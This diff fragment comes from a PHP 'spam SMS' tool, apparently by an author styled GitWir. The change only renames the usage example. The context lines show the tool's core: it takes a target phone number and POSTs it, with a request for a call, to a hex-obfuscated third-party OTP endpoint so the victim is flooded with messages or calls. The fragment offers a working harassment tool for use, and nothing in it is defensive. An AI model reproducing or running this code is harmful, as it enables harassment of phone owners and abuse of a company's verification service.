@@ -61,7 +61,7 @@ youtube : 91 W1
 
 echo $G."\n========[]Author : GitWir[]========".$X."\n";
 echo $RR."\n=======[~]root@WiraGans[~]========".$X."\n";
-isset($argv[1]) OR die($RR."[!]==Contoh : php ICTspam.php (no.08xxx)==[!]\n".$X);
+isset($argv[1]) OR die($RR."[!]==Contoh : php spmm.php (no.08xxx)==[!]\n".$X);
 if(is_numeric($argv[1])) {
 	echo "[]Prossesing Spam SmS[] #".$G.$argv[1].$X."\n";
 	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70","msisdn=".$argv[1]."&accept=call");
